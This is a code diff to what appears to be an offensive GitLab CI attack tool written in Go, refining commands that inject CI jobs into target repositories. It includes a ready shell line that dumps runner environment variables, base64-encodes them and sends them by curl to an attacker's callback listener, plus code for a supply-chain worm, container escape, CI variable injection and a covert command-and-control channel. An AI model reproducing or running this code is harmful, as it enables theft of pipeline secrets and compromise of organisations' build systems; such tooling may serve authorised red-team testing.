@@ -54,19 +54,16 @@ func runAttackRorListen(ctx context.Context, cmd *cobra.Command, client *gitlabx
 	actualAddr := listener.Addr()
 
 	// Build the ror-shell webhook URL (reachable from runners)
-	webhookURL := strings.TrimSpace(atkWebhook)
-	if webhookURL == "" {
-		webhookURL = fmt.Sprintf("http://%s/callback", strings.TrimPrefix(actualAddr, "["))
-	}
+	webhookURL := rorCallbackURL(strings.TrimSpace(atkWebhook), actualAddr)
 
 	// Build the ror-shell command that sends env dump to the webhook
 	rorCmd := strings.TrimSpace(atkCmd)
 	if rorCmd == "" {
 		// Default: execute a basic command AND send results to the listener
-		rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s/callback" || true`, webhookURL)
+		rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s" || true`, webhookURL)
 	} else {
 		// User provided a custom cmd: also send it to the listener
-		rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s/callback" || true`, rorCmd, webhookURL)
+		rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s" || true`, rorCmd, webhookURL)
 	}
 
 	// Override atkWebhook so renderPayload picks it up
@@ -144,6 +141,17 @@ func runAttackRorListen(ctx context.Context, cmd *cobra.Command, client *gitlabx
 	// Shutdown listener
 	_ = listener.Stop(ctx)
 	return nil
+}
+
+func rorCallbackURL(webhookURL, actualAddr string) string {
+	webhookURL = strings.TrimRight(strings.TrimSpace(webhookURL), "/")
+	if webhookURL == "" {
+		webhookURL = "http://" + strings.TrimPrefix(actualAddr, "[")
+	}
+	if strings.HasSuffix(webhookURL, "/callback") {
+		return webhookURL
+	}
+	return webhookURL + "/callback"
 }
 
 // runAttackMemoryDump injects a CI job that dumps secrets from runner process memory.
@@ -252,7 +260,11 @@ func runAttackSupplyChainWorm(ctx context.Context, cmd *cobra.Command, client *g
 	}
 
 	if listener != nil {
-		collectWormCallbacks(ctx, cmd, listener, result.Promoted)
+		expectedCallbacks := result.Promoted
+		if result.InitialCompromised {
+			expectedCallbacks++
+		}
+		collectWormCallbacks(ctx, cmd, listener, expectedCallbacks)
 	}
 	return nil
 }
@@ -378,7 +390,7 @@ func runAttackContainerEscape(ctx context.Context, cmd *cobra.Command, client *g
 	}
 	ceImage := strings.TrimSpace(atkImage)
 	if ceImage == "" {
-		ceImage = "docker:dind"
+		ceImage = "docker:latest"
 	}
 	yaml := payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
 		Common: payloadgen.CommonOptions{
@@ -392,8 +404,8 @@ func runAttackContainerEscape(ctx context.Context, cmd *cobra.Command, client *g
 		},
 		ExfilMethod:  strings.TrimSpace(atkExfilMethod),
 		ExfilTarget:  strings.TrimSpace(atkExfilTarget),
+		HostCommand:  escapeCmd,
 		EscapeMethod: escapeMethod,
-		EscapeCmd:    escapeCmd,
 		MountPath:    mountPath,
 	})
 	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
@@ -487,6 +499,19 @@ func runAttackVariableInject(ctx context.Context, cmd *cobra.Command, client *gi
 			}{Key: v.Key, Scope: scope, Success: err == nil, Error: ifErr(err)})
 		}
 	}
+	succeeded := 0
+	for _, result := range results {
+		if result.Success {
+			succeeded++
+		}
+	}
+	failed := len(results) - succeeded
+	resultErr := error(nil)
+	if len(results) == 0 {
+		resultErr = fmt.Errorf("--inject-vars did not contain any non-empty keys")
+	} else if failed > 0 {
+		resultErr = fmt.Errorf("%d of %d variable injections failed", failed, len(results))
+	}
 	if outputJSON {
 		b, _ := json.MarshalIndent(struct {
 			Scope    string `json:"scope"`
@@ -514,10 +539,14 @@ func runAttackVariableInject(ctx context.Context, cmd *cobra.Command, client *gi
 				return out
 			}(),
 		}, "", "  ")
-		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
-		return err
+		if _, err := fmt.Fprintln(cmd.OutOrStdout(), string(b)); err != nil {
+			return err
+		}
+		return resultErr
 	}
-	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected %d variables into %s scope", len(results), scope))
+	if succeeded > 0 {
+		renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected %d of %d variables into %s scope", succeeded, len(results), scope))
+	}
 	for _, r := range results {
 		if r.Success {
 			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  ✓ %s (%s)", r.Key, r.Scope))
@@ -525,7 +554,7 @@ func runAttackVariableInject(ctx context.Context, cmd *cobra.Command, client *gi
 			renderError(cmd.OutOrStdout(), fmt.Sprintf("  ✗ %s: %s", r.Key, r.Error))
 		}
 	}
-	return nil
+	return resultErr
 }
 
 // runAttackC2Channel establishes a covert C2 channel via DNS tunnel, steganography, etc.
